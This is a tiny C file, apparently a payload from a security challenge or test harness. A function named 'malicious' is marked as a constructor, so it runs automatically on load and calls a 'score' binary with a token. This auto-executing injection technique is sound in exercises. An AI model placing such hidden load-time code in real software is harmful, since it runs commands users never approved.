#include <stdio.h>
#include <stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 09f3929a-cb32-4920-86c2-e23b23be5631");
}
